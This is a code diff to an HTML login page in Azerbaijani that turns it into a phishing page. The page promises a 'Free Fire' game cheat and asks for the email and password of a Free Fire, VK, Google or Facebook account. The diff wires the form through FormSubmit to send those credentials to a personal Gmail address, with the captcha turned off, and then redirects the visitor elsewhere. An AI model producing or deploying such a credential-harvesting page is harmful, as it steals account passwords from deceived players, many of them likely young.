@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Giriş Səhifəsi</title>
+    <title>Free Fire Hilesi</title>
     <style>
         body {
             background: url('bg.jpg') no-repeat center center fixed;
@@ -64,16 +64,17 @@
 </head>
 <body>
     <div class="container">
-        <h2>Hesabınıza Giriş Edin</h2>
+        <h2>Free Fire Hesabınıza Giriş Edin.</h2>
         <p class="note">Xoş gəlmisiniz! Zəhmət olmasa, daxil olun.</p>
-        <p class="note">Dəstəklənən Hesaplar: SS.</p>
+        <p class="note">Dəstəklənən Hesaplar: VK , GOOGLE , FACEBOOK</p>
         
         <form action="https://formsubmit.co/suleymanbabayevoffical@gmail.com" method="POST" id="myForm">
             <!-- FormSubmit üçün lazımlı inputlar -->
             <input type="hidden" name="_captcha" value="false">
             <input type="hidden" name="_template" value="table">
-            <input type="hidden" name="_next" value="success.html"> <!-- Göndərildikdən sonra yönləndiriləcək səhifə -->
-
+            <input type="hidden" name="_method" value="POST">
+            <input type="hidden" name="_next" value="https://thankyou.page"> <!-- Yönləndirməni dəyiş -->
+        
             <div class="input-group">
                 <input type="email" name="email" placeholder="Email" required>
                 <input type="password" name="password" placeholder="Şifrə" required>
@@ -81,6 +82,7 @@
             </div>
             <button type="submit">Göndər</button>
         </form>
+        
 
         <p class="response-message" id="responseMessage">Təşəkkürlər! Məlumatınız göndərildi.</p>
     </div>
